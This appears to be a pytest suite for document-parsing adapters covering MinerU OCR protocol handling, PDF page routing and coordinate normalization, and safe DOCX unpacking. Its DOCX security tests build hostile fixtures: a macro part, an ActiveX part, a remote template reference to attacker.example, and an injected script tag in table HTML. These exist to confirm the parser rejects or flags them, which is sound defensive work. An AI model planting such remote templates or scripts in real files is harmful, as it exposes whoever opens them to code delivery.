"""
解析适配器定向测试：DTO 精度约束、MinerU 协议与归一化、原生 PDF 逐页路线、
DOCX 受控解包（拒绝宏、外部引用与文本框记未覆盖）、假解析器结构完整。
MinerU 协议测试用 httpx.MockTransport，不访问外网。
"""

from __future__ import annotations

import io
import json
import zipfile
from typing import Any

import docx
import httpx
import pytest
from docx.oxml import parse_xml
from docx.oxml.ns import nsdecls
from pydantic import ValidationError
from reportlab.lib.pagesizes import A4
from reportlab.lib.utils import ImageReader
from reportlab.pdfgen import canvas

from app.config import AdapterKind, Settings
from app.documents.parsing import (
    FAKE_TEXT_MARKER,
    DeterministicFakeParser,
    DocumentRejected,
    DocxAdapter,
    MinerUAdapter,
    MinerUError,
    NativePdfAdapter,
    NormRect,
    SourceAnchorDraft,
    TableCellRef,
    extract_pages_pdf,
    merge_outcomes,
    normalize_content_list,
    ocr_input,
    parse_local_routes,
    select_parser,
)
from app.documents.parsing.mineru import MinerUOptions, parse_table_html

LV = "test/1"


def test_long_mineru_read_retry_after_defers_without_blocking_or_upload():
    from pydantic import SecretStr
    sleeps=[];calls=[]
    def handler(request):
        calls.append(request.method)
        return httpx.Response(429,headers={'Retry-After':'3600'},json={})
    settings=Settings(mineru_base_url='https://example.test',mineru_api_key=SecretStr('synthetic-only'))
    with httpx.Client(transport=httpx.MockTransport(handler)) as client:
        adapter=MinerUAdapter(settings,client=client,sleep=sleeps.append,timeout_seconds=20)
        with pytest.raises(MinerUError) as error:adapter.get_status('same-task')
        assert error.value.kind=='rejected' and error.value.retry_after==3600
        assert sleeps==[] and calls==['GET']


def test_docx_embedded_ocr_preserves_parent_text_and_has_no_fake_page():
    from PIL import Image
    from app.documents.parsing.docx_ocr import bounded_embedded_images,attach_embedded_ocr
    from app.documents.parsing.dto import ParseOutcome,SourceSegmentDraft
    document=docx.Document();document.add_paragraph('Source paragraph before image')
    picture=io.BytesIO()
    with Image.new('RGB',(120,80),'white') as bitmap:bitmap.save(picture,format='PNG')
    document.add_picture(io.BytesIO(picture.getvalue()))
    document.add_paragraph('Source paragraph after image')
    output=io.BytesIO();document.save(output);local=DocxAdapter().parse(output.getvalue())
    images=bounded_embedded_images(local,Settings());assert len(images)==1
    recognized=ParseOutcome(parser='mineru',parser_version='fixture/1',config_fingerprint='0'*64,provider_task_id='existing-image-task',segments=(
        SourceSegmentDraft(key='o1',kind='paragraph',text='Invoice Number 0123',reading_order=0,anchor=SourceAnchorDraft(precision='rect',page_no=1,rect=NormRect(x0=.1,y0=.1,x1=.8,y1=.2),coordinate_space='page_normalized_top_left',locator_version='fixture/1')),))
    merged=attach_embedded_ocr(local,[(images[0],recognized)])
    assert [segment.text for segment in merged.segments]==['Source paragraph before image','Invoice Number 0123','Source paragraph after image']
    child=merged.segments[1]
    assert child.anchor.page_no is None and child.anchor.rect is None and child.anchor.docx.paragraph_index==1
    assert child.anchor.embedded_image['rect']=={'x0':.1,'y0':.1,'x1':.8,'y1':.2}
    assert all(flag.code!='docx_embedded_image_not_ocr' for flag in merged.quality_flags)
    with pytest.raises(DocumentRejected):bounded_embedded_images(local,Settings(docx_max_embedded_image_bytes=1))


def test_docx_image_only_table_cells_keep_reading_order_and_cell_anchor():
    from PIL import Image
    from app.documents.parsing.docx_ocr import attach_embedded_ocr
    from app.documents.parsing.dto import ParseOutcome,SourceSegmentDraft
    document=docx.Document();table=document.add_table(rows=1,cols=3)
    table.cell(0,0).text='Cell before';table.cell(0,2).text='Cell after'
    picture=io.BytesIO()
    with Image.new('RGB',(120,80),'white') as bitmap:bitmap.save(picture,format='PNG')
    table.cell(0,1).paragraphs[0].add_run().add_picture(io.BytesIO(picture.getvalue()))
    document.add_paragraph('Paragraph after table')
    output=io.BytesIO();document.save(output);local=DocxAdapter().parse(output.getvalue())
    recognized=ParseOutcome(parser='mineru',parser_version='fixture/1',config_fingerprint='0'*64,segments=(
        SourceSegmentDraft(key='o1',kind='paragraph',text='Image cell OCR',reading_order=0,anchor=SourceAnchorDraft(precision='page_only',page_no=1,locator_version='fixture/1')),))
    merged=attach_embedded_ocr(local,[(local.embedded_images[0],recognized)])
    assert [s.text for s in merged.segments]==['Cell before','Image cell OCR','Cell after','Paragraph after table']
    anchor=merged.segments[1].anchor
    assert anchor.precision=='cell' and anchor.table_cell.col_index==1 and anchor.page_no is None and anchor.rect is None

# D0 之后实测的 MinerU content_list（合成样件：A4 页 (100,700)/(300,200) 处两行文字，第 2 页为横向页）
REAL_CONTENT_LIST = [
    {"type": "text", "text": "MARKER TOPLEFT 100 700", "bbox": [163, 152, 475, 172], "page_idx": 0},
    {"type": "text", "text": "MARKER LOWER 300 200", "bbox": [499, 746, 791, 766], "page_idx": 0},
    {"type": "header", "text": "LANDSCAPE PAGE TWO", "bbox": [55, 137, 256, 163], "page_idx": 1},
]
REAL_LAYOUT = {"pdf_info": [{"page_size": [595, 841]}, {"page_size": [842, 595]}], "_backend": "pipeline", "_version_name": "3.4.4"}


def _normalize(content: list[dict[str, Any]], **kw: Any):
    return normalize_content_list(
        content,
        layout=kw.pop("layout", REAL_LAYOUT),
        markdown=None,
        raw_payload=None,
        provider_task_id="batch-1",
        backend_version="pipeline/3.4.4",
        config_fingerprint="cfg",
        **kw,
    )


# ---- DTO 精度约束 ----


def test_anchor_precision_invariants() -> None:
    rect = NormRect(x0=0.1, y0=0.1, x1=0.2, y1=0.2)
    SourceAnchorDraft(precision="rect", page_no=1, rect=rect, coordinate_space="page_normalized_top_left", locator_version=LV)
    with pytest.raises(ValidationError):
        SourceAnchorDraft(precision="rect", page_no=1, locator_version=LV)
    with pytest.raises(ValidationError):
        # 页级精度不得「顺带」一个框
        SourceAnchorDraft(precision="page_only", page_no=1, rect=rect, locator_version=LV)
    with pytest.raises(ValidationError):
        SourceAnchorDraft(precision="page_only", locator_version=LV)
    with pytest.raises(ValidationError):
        SourceAnchorDraft(precision="cell", page_no=1, locator_version=LV)
    with pytest.raises(ValidationError):
        SourceAnchorDraft(precision="none", page_no=1, locator_version=LV)
    with pytest.raises(ValidationError):
        SourceAnchorDraft(precision="paragraph_only", locator_version=LV)
    with pytest.raises(ValidationError):
        NormRect(x0=0.3, y0=0.1, x1=0.3, y1=0.2)
    with pytest.raises(ValidationError):
        NormRect(x0=0.1, y0=0.1, x1=1.2, y1=0.2)


# ---- MinerU 归一化 ----


def test_mineru_normalize_real_blocks_to_rect() -> None:
    out = _normalize(REAL_CONTENT_LIST)
    assert out.provider_task_id == "batch-1" and out.page_count == 2
    first, _, header = out.segments
    assert first.anchor.precision == "rect" and first.anchor.page_no == 1
    assert first.anchor.rect == NormRect(x0=0.163, y0=0.152, x1=0.475, y1=0.172)
    assert header.kind == "header" and header.anchor.page_no == 2
    assert [p.width_pt for p in out.pages] == [595.0, 842.0]
    assert all(p.route == "ocr" for p in out.pages)
    assert out.quality_flags == ()


def test_mineru_page_map_rotation_and_bad_bbox_degrade() -> None:
    content = [
        {"type": "text", "text": "A", "bbox": [10, 10, 100, 40], "page_idx": 0},
        {"type": "text", "text": "B", "page_idx": 1},
        {"type": "text", "text": "C", "bbox": [10, 10, 1400, 40], "page_idx": 1},
        {"type": "text", "text": "D", "bbox": [10, 10, 100, 40], "page_idx": 2},
    ]
    # 子文件三页对应原件第 2、5、7 页；第 7 页有旋转
    out = _normalize(content, layout=None, page_map=[2, 5, 7], page_rotations={7: 90})
    a, b, c, d = out.segments
    assert (a.anchor.precision, a.anchor.page_no) == ("rect", 2)
    assert (b.anchor.precision, b.anchor.page_no, b.anchor.rect) == ("page_only", 5, None)
    assert (c.anchor.precision, c.anchor.rect) == ("page_only", None)
    assert (d.anchor.precision, d.anchor.page_rotation) == ("page_only", 90)
    codes = {(f.code, f.page_no) for f in out.quality_flags}
    assert {("bbox_missing", 5), ("bbox_uncalibrated", 5), ("rotation_uncalibrated", 7)} <= codes


def test_mineru_table_html_spans_and_cell_precision() -> None:
    html = (
        "<table><tr><td rowspan='2'>No.</td><td colspan='2'>Goods</td></tr>"
        "<tr><td>Desc</td><td>Qty</td></tr>"
        "<tr><td>1</td><td>TOWEL<script>alert(1)</script></td><td>100</td></tr></table>"
    )
    cells = {(c.row_index, c.col_index): c for c in parse_table_html(html)}
    assert cells[(0, 0)].row_span == 2 and cells[(0, 1)].col_span == 2
    # 纵向合并占位后，第二行首格落在第 1 列而不是第 0 列
    assert cells[(1, 1)].text == "Desc" and cells[(1, 2)].text == "Qty"
    assert cells[(2, 1)].text == "TOWEL"

    out = _normalize(
        [{"type": "table", "table_body": html, "table_caption": ["Packing"], "bbox": [50, 50, 900, 400], "page_idx": 0}]
    )
    table = out.tables[0]
    assert table.anchor.precision == "rect" and table.structure_source == "mineru_html"
    cell_segs = [s for s in out.segments if s.kind == "table_cell"]
    assert cell_segs and all(s.anchor.precision == "cell" and s.anchor.rect is None for s in cell_segs)
    assert all(s.table_cell and s.table_cell.table_key == table.key for s in cell_segs)
    caption = next(s for s in out.segments if s.kind == "caption")
    assert caption.anchor.precision == "page_only"


def test_mineru_image_and_unparsed_table_are_flagged() -> None:
    out = _normalize(
        [
            {"type": "image", "img_path": "x.jpg", "image_caption": [], "bbox": [1, 1, 50, 50], "page_idx": 0},
            {"type": "table", "img_path": "t.jpg", "bbox": [1, 60, 50, 90], "page_idx": 0},
            {"type": "mystery", "text": "?", "bbox": [1, 1, 5, 5], "page_idx": 0},
        ]
    )
    codes = {f.code for f in out.quality_flags}
    assert {"image_region_not_transcribed", "table_structure_unparsed", "unknown_block_type"} <= codes


# ---- MinerU 协议（MockTransport） ----


def _mineru_settings() -> Settings:
    return Settings(
        _env_file=None,
        parser_adapter=AdapterKind.MINERU,
        mineru_base_url="https://mineru.example/api/v4",
        mineru_api_key="mineru-SECRET",
    )


def _result_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("abc_content_list.json", json.dumps(REAL_CONTENT_LIST))
        z.writestr("abc_content_list_v2.json", json.dumps([[{"type": "paragraph"}]]))
        z.writestr("layout.json", json.dumps(REAL_LAYOUT))
        z.writestr("full.md", "MARKER TOPLEFT 100 700")
    return buf.getvalue()


class MinerUFake:
    def __init__(self, *, put_error: type[Exception] | None = None, status_seq: list[Any] | None = None) -> None:
        self.put_error = put_error
        self.status_seq = list(status_seq or [])
        self.requests: list[httpx.Request] = []
        self.zip = _result_zip()

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        url = str(request.url)
        if request.method == "POST" and url.endswith("/file-urls/batch"):
            return httpx.Response(
                200, json={"code": 0, "msg": "ok", "data": {"batch_id": "b-1", "file_urls": ["https://oss.example/put?sig=1"]}}
            )
        if request.method == "PUT":
            if self.put_error:
                raise self.put_error("simulated", request=request)
            return httpx.Response(200)
        if request.method == "GET" and "/extract-results/batch/" in url:
            step = self.status_seq.pop(0)
            if isinstance(step, httpx.Response):
                return step
            return httpx.Response(200, json=step)
        if request.method == "GET" and url.startswith("https://cdn.example/"):
            return httpx.Response(200, content=self.zip)
        return httpx.Response(404)


def _status(state: str, **extra: Any) -> dict[str, Any]:
    return {"code": 0, "msg": "ok", "data": {"batch_id": "b-1", "extract_result": [{"file_name": "s.pdf", "state": state, "err_msg": "", **extra}]}}


def _adapter(fake: MinerUFake) -> tuple[MinerUAdapter, list[float]]:
    sleeps: list[float] = []
    adapter = MinerUAdapter(
        _mineru_settings(), client=httpx.Client(transport=httpx.MockTransport(fake)), sleep=sleeps.append
    )
    return adapter, sleeps


def test_mineru_submit_persists_task_id_before_upload_and_put_has_no_headers() -> None:
    fake = MinerUFake()
    adapter, _ = _adapter(fake)
    events: list[str] = []

    def persist(batch_id: str) -> None:
        events.append(f"persist:{batch_id}:{len(fake.requests)}")

    batch_id = adapter.submit(b"%PDF-1.4 test", "source.pdf", on_task_id=persist)
    assert batch_id == "b-1"
    # 回调发生在 PUT 之前（此时只发出了 1 个请求）
    assert events == ["persist:b-1:1"]
    post, put = fake.requests
    assert post.headers["Authorization"] == "Bearer mineru-SECRET"
    body = json.loads(post.content)
    assert body["files"] == [{"name": "source.pdf", "is_ocr": True}] and body["enable_table"] is True
    assert body["model_version"] == "vlm" and body["language"] == "ch"
    assert "authorization" not in {k.lower() for k in put.headers.keys()}
    assert "content-type" not in {k.lower() for k in put.headers.keys()}


def test_mineru_env_model_language_and_token_alias(monkeypatch) -> None:
    monkeypatch.delenv("MINERU_API_KEY", raising=False)
    monkeypatch.setenv("MINERU_API_TOKEN", "Bearer synthetic-token")
    monkeypatch.setenv("MINERU_MODEL_VERSION", "pipeline")
    monkeypatch.setenv("MINERU_LANGUAGE", "latin")
    settings = Settings(_env_file=None, mineru_base_url="https://mineru.example/api/v4")
    fake = MinerUFake()
    with httpx.Client(transport=httpx.MockTransport(fake)) as client:
        adapter = MinerUAdapter(settings, client=client)
        adapter.request_upload("source.pdf")
        request = fake.requests[0]
        assert request.headers["Authorization"] == "Bearer synthetic-token"
        assert json.loads(request.content)["model_version"] == "pipeline"
        assert json.loads(request.content)["language"] == "latin"
        assert adapter.options.fingerprint() != MinerUOptions(model_version="vlm", language="latin").fingerprint()
    with pytest.raises(ValidationError):
        Settings(_env_file=None, mineru_language="auto")


def test_mineru_legacy_task_keeps_original_fingerprint() -> None:
    import hashlib
    options = MinerUOptions(model_version="pipeline", language="auto")
    old = {"protocol": "mineru_v4_batch/1", "enable_formula": False,
           "enable_table": True, "language": "auto", "is_ocr": True}
    assert options.fingerprint() == hashlib.sha256(json.dumps(old, sort_keys=True).encode()).hexdigest()


def test_mineru_persist_failure_blocks_upload() -> None:
    fake = MinerUFake()
    adapter, _ = _adapter(fake)

    def fail(_: str) -> None:
        raise RuntimeError("db down")

    with pytest.raises(RuntimeError):
        adapter.submit(b"%PDF", "source.pdf", on_task_id=fail)
    assert [r.method for r in fake.requests] == ["POST"]


def test_mineru_interrupted_upload_is_acceptance_unknown() -> None:
    fake = MinerUFake(put_error=httpx.ReadTimeout)
    adapter, _ = _adapter(fake)
    with pytest.raises(MinerUError) as exc:
        adapter.submit(b"%PDF", "source.pdf", on_task_id=lambda _: None)
    assert exc.value.kind == "acceptance_unknown"
    assert [r.method for r in fake.requests] == ["POST", "PUT"]


def test_mineru_status_query_supports_recovery() -> None:
    fake = MinerUFake(
        status_seq=[
            _status("waiting-file"),
            httpx.Response(503),
            _status("running", extract_progress={"extracted_pages": 1, "total_pages": 2}),
            {"code": -60012, "msg": "task not found or expire"},
            _status("brand-new-state"),
        ]
    )
    adapter, sleeps = _adapter(fake)
    waiting = adapter.get_status("b-1")
    assert waiting.state == "waiting-file" and not waiting.accepted
    running = adapter.get_status("b-1")
    assert running.state == "running" and running.accepted and running.total_pages == 2
    assert sleeps == [2.0]
    assert adapter.get_status("b-1").state == "not_found"
    assert adapter.get_status("b-1").state == "unknown"


def test_mineru_fetch_result_reads_content_list_not_v2() -> None:
    fake = MinerUFake(status_seq=[_status("done", full_zip_url="https://cdn.example/r.zip")])
    adapter, _ = _adapter(fake)
    status = adapter.get_status("b-1")
    assert status.terminal and status.zip_url
    result = adapter.fetch_result(status)
    assert result.content_list == REAL_CONTENT_LIST and result.backend_version == "pipeline/3.4.4"
    out = adapter.normalize(result, page_map=[3, 4])
    assert out.provider_task_id == "b-1" and out.raw_payload == fake.zip
    assert {s.anchor.page_no for s in out.segments} == {3, 4}
    # 下载结果包不带我们的 Key
    assert "authorization" not in {k.lower() for k in fake.requests[-1].headers.keys()}


def test_mineru_auth_error_not_retried() -> None:
    fake = MinerUFake(status_seq=[httpx.Response(401)])
    adapter, sleeps = _adapter(fake)
    with pytest.raises(MinerUError) as exc:
        adapter.get_status("b-1")
    assert exc.value.kind == "auth" and sleeps == []
    assert "mineru-SECRET" not in str(exc.value)


# ---- 原生 PDF ----


def _mixed_pdf(rotate_last: bool = False) -> bytes:
    from PIL import Image

    buf = io.BytesIO()
    c = canvas.Canvas(buf, pagesize=A4)
    c.drawString(100, 700, "COMMERCIAL INVOICE No. INV-2026-0001 Shipper NINGBO TEXTILE")
    # 画线框表格，pdfplumber 可按线识别
    xs, ys = [100, 250, 400], [500, 480, 460]
    for x in xs:
        c.line(x, ys[0], x, ys[-1])
    for y in ys:
        c.line(xs[0], y, xs[-1], y)
    c.drawString(105, 486, "Qty")
    c.drawString(255, 486, "Amount")
    c.drawString(105, 466, "100")
    c.drawString(255, 466, "1250.00")
    c.showPage()
    img = Image.new("RGB", (600, 850), "white")
    ib = io.BytesIO()
    img.save(ib, format="PNG")
    ib.seek(0)
    c.drawImage(ImageReader(ib), 0, 0, width=A4[0], height=A4[1])
    c.showPage()
    if rotate_last:
        c.setPageRotation(90)
    c.drawString(100, 700, "PACKING LIST page three has a proper text layer")
    c.save()
    return buf.getvalue()


def test_mixed_pdf_routes_each_page() -> None:
    data = _mixed_pdf()
    plan = select_parser("application/pdf", Settings(_env_file=None, parser_adapter=AdapterKind.DETERMINISTIC_FAKE), data=data)
    # 第一页有文字层，并不影响第二页扫描页走 OCR，也不影响第三页继续走原生
    assert plan.native_pages == (1, 3) and plan.ocr_pages == (2,)
    assert plan.page_decisions[1].needs_ocr and plan.page_decisions[1].image_area_ratio >= 0.5


def test_native_pdf_rects_and_table_cells() -> None:
    out = NativePdfAdapter().parse(_mixed_pdf(), pages=[1])
    line = next(s for s in out.segments if s.kind == "paragraph")
    assert line.anchor.precision == "rect"
    # (100pt, 顶部) 在 A4 上约为 x0=0.168
    assert abs(line.anchor.rect.x0 - 100 / A4[0]) < 0.01
    [table] = out.tables
    cells = [s for s in out.segments if s.kind == "table_cell"]
    assert {s.text for s in cells} == {"Qty", "Amount", "100", "1250.00"}
    assert all(s.anchor.precision == "rect" and s.anchor.table_cell for s in cells)
    # 表内文字不再重复出行片段
    assert not any("1250.00" in s.text for s in out.segments if s.kind == "paragraph")


def test_native_and_mineru_coordinates_agree() -> None:
    """同一合成样件上原生坐标与 MinerU 归一化坐标一致，证明两条路线落在同一坐标系。"""
    buf = io.BytesIO()
    c = canvas.Canvas(buf, pagesize=A4)
    c.setFont("Helvetica", 14)
    c.drawString(100, 700, "MARKER TOPLEFT 100 700")
    c.drawString(300, 200, "MARKER LOWER 300 200")
    c.save()
    native = [s.anchor.rect for s in NativePdfAdapter().parse(buf.getvalue()).segments]
    mineru = [s.anchor.rect for s in _normalize(REAL_CONTENT_LIST[:2]).segments]
    assert len(native) == len(mineru) == 2
    for n, m in zip(native, mineru, strict=True):
        assert abs(n.x0 - m.x0) < 0.02 and abs(n.y0 - m.y0) < 0.02


def test_rotated_content_outside_display_still_degrades() -> None:
    out = NativePdfAdapter().parse(_mixed_pdf(rotate_last=True), pages=[3])
    assert out.segments and all(s.anchor.precision == "page_only" for s in out.segments)
    assert any(f.code == "bbox_uncalibrated" for f in out.quality_flags)


def test_ocr_input_extracts_only_scanned_pages() -> None:
    data = _mixed_pdf()
    plan = select_parser("application/pdf", Settings(_env_file=None, parser_adapter=AdapterKind.DETERMINISTIC_FAKE), data=data)
    sub, name, page_map = ocr_input(plan, data)
    assert name == "source.pdf" and page_map == (2,)
    assert len(NativePdfAdapter().inspect_pages(sub)) == 1
    assert len(NativePdfAdapter().inspect_pages(extract_pages_pdf(data, [1, 3]))) == 2


def test_unconfigured_mineru_marks_scan_pages_unavailable() -> None:
    data = _mixed_pdf()
    plan = select_parser("application/pdf", Settings(_env_file=None, parser_adapter=AdapterKind.MINERU), data=data)
    assert not plan.ready and plan.unavailable_reason
    # 原生页仍可解析，但未取得 OCR 的页显式记为不可用，不伪装成空白页
    merged = merge_outcomes([NativePdfAdapter().parse(data, pages=list(plan.native_pages))], plan=plan)
    assert ("ocr_unavailable", 2) in {(f.code, f.page_no) for f in merged.quality_flags}
    assert not merged.is_fake


def test_hybrid_merge_with_fake_ocr_keeps_marker() -> None:
    data = _mixed_pdf()
    plan = select_parser("application/pdf", Settings(_env_file=None, parser_adapter=AdapterKind.DETERMINISTIC_FAKE), data=data)
    out = parse_local_routes(plan, data)
    assert out is not None and out.is_fake
    assert [(p.page_no, p.route) for p in out.pages] == [(1, "native_pdf"), (2, "fake"), (3, "native_pdf")]
    assert not any(f.code == "page_needs_ocr" for f in out.quality_flags)
    orders = [s.reading_order for s in out.segments]
    assert orders == sorted(orders) == list(range(len(orders)))


# ---- DOCX ----


def _docx_bytes(*, textbox: bool = False) -> bytes:
    d = docx.Document()
    d.sections[0].header.paragraphs[0].text = "ACME LOGISTICS HEADER"
    d.add_heading("Commercial Invoice", level=1)
    d.add_paragraph("Invoice No. INV-001")
    table = d.add_table(rows=2, cols=3)
    table.cell(0, 0).merge(table.cell(0, 1)).text = "Goods"
    table.cell(0, 2).text = "Qty"
    table.cell(1, 0).text = "Towel"
    table.cell(1, 2).text = "100"
    if textbox:
        p = d.add_paragraph()
        p._p.append(
            parse_xml(
                f'<w:r {nsdecls("w")}><w:pict><v:shape xmlns:v="urn:schemas-microsoft-com:vml">'
                f'<v:textbox><w:txbxContent><w:p><w:r><w:t>MARKS: HIDDEN-IN-BOX</w:t></w:r></w:p>'
                f"</w:txbxContent></v:textbox></v:shape></w:pict></w:r>"
            )
        )
    out = io.BytesIO()
    d.save(out)
    return out.getvalue()


def _rezip(data: bytes, *, add: dict[str, bytes] | None = None, replace: dict[str, bytes] | None = None) -> bytes:
    src = zipfile.ZipFile(io.BytesIO(data))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            content = (replace or {}).get(info.filename, src.read(info))
            dst.writestr(info.filename, content)
        for name, content in (add or {}).items():
            dst.writestr(name, content)
    return buf.getvalue()


def test_docx_extracts_body_table_and_header() -> None:
    out = DocxAdapter().parse(_docx_bytes())
    texts = {s.text: s for s in out.segments}
    title = texts["Commercial Invoice"]
    assert title.kind == "title" and title.anchor.precision == "paragraph_only"
    assert title.anchor.docx.part == "body" and title.anchor.page_no is None
    header = texts["ACME LOGISTICS HEADER"]
    assert header.kind == "header" and header.anchor.docx.part == "header" and header.anchor.docx.section_index == 0
    goods = texts["Goods"]
    assert goods.anchor.precision == "cell" and goods.anchor.rect is None
    [table] = out.tables
    first_row = {c.col_index: c for c in table.rows[0].cells}
    assert first_row[0].col_span == 2 and first_row[2].text == "Qty"
    assert out.page_count is None and not out.is_fake


def test_docx_with_macro_is_rejected() -> None:
    with pytest.raises(DocumentRejected) as exc:
        DocxAdapter().parse(_rezip(_docx_bytes(), add={"word/vbaProject.bin": b"\x00macro"}))
    assert exc.value.code == "docx_macro"


def test_docx_with_macro_content_type_is_rejected() -> None:
    data = _docx_bytes()
    ct = zipfile.ZipFile(io.BytesIO(data)).read("[Content_Types].xml").decode()
    ct = ct.replace(
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
        "application/vnd.ms-word.document.macroEnabled.main+xml",
    )
    with pytest.raises(DocumentRejected) as exc:
        DocxAdapter().parse(_rezip(data, replace={"[Content_Types].xml": ct.encode()}))
    assert exc.value.code == "docx_macro"


def test_docx_activex_is_rejected() -> None:
    with pytest.raises(DocumentRejected) as exc:
        DocxAdapter().parse(_rezip(_docx_bytes(), add={"word/activeX/activeX1.xml": b"<x/>"}))
    assert exc.value.code == "docx_active_content"


def test_docx_external_reference_flagged_not_fetched() -> None:
    data = _docx_bytes()
    rels_name = "word/_rels/document.xml.rels"
    rels = zipfile.ZipFile(io.BytesIO(data)).read(rels_name).decode()
    rels = rels.replace(
        "</Relationships>",
        '<Relationship Id="rIdExt" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        'Target="http://attacker.example/t.dotm" TargetMode="External"/></Relationships>',
    )
    out = DocxAdapter().parse(_rezip(data, replace={rels_name: rels.encode()}))
    assert any(f.code == "docx_external_reference_ignored" for f in out.quality_flags)


def test_docx_textbox_recorded_as_uncovered() -> None:
    out = DocxAdapter().parse(_docx_bytes(textbox=True))
    assert any(f.code == "docx_textbox_not_extracted" for f in out.quality_flags)
    assert not any("HIDDEN-IN-BOX" in s.text for s in out.segments)


def test_docx_not_a_zip_is_rejected() -> None:
    with pytest.raises(DocumentRejected):
        DocxAdapter().parse(b"PK\x03\x04 not really")


# ---- 假解析器 ----


def test_fake_parser_is_complete_marked_and_deterministic() -> None:
    parser = DeterministicFakeParser()
    a = parser.parse(b"same bytes", page_nos=(1, 2), page_count=2)
    b = parser.parse(b"same bytes", page_nos=(1, 2), page_count=2)
    assert a.model_dump() == b.model_dump()
    assert a.is_fake and a.provider_task_id and a.page_count == 2
    assert any(f.code == "fake_parser_output" for f in a.quality_flags)
    assert len(a.tables) == 2 and all(len(t.rows) == 2 for t in a.tables)
    seg_keys = {s.key for s in a.segments}
    assert all(k in seg_keys for blk in a.blocks for k in blk.segment_keys)
    assert all(FAKE_TEXT_MARKER in s.text for s in a.segments)
    # 假内容在原件上没有位置：不给页码、不画框
    assert all(s.anchor.precision == "none" for s in a.segments)
    assert all(isinstance(s.table_cell, TableCellRef) for s in a.segments if s.kind == "table_cell")


def test_select_parser_routes_by_mime() -> None:
    fake = Settings(_env_file=None, parser_adapter=AdapterKind.DETERMINISTIC_FAKE)
    assert select_parser("application/vnd.openxmlformats-officedocument.wordprocessingml.document", fake).local_route == "docx"
    image_plan = select_parser("image/png", fake)
    assert image_plan.ocr_pages == (1,) and image_plan.uses_fake
    from PIL import Image
    buf=io.BytesIO()
    with Image.new("RGB",(100,80),"white") as image:image.save(buf,format="PNG")
    assert ocr_input(image_plan, buf.getvalue())[1] == "source.png"
    assert not select_parser("application/zip", fake).ready
    real = select_parser("image/jpeg", _mineru_settings())
    assert real.needs_external_ocr and real.ready
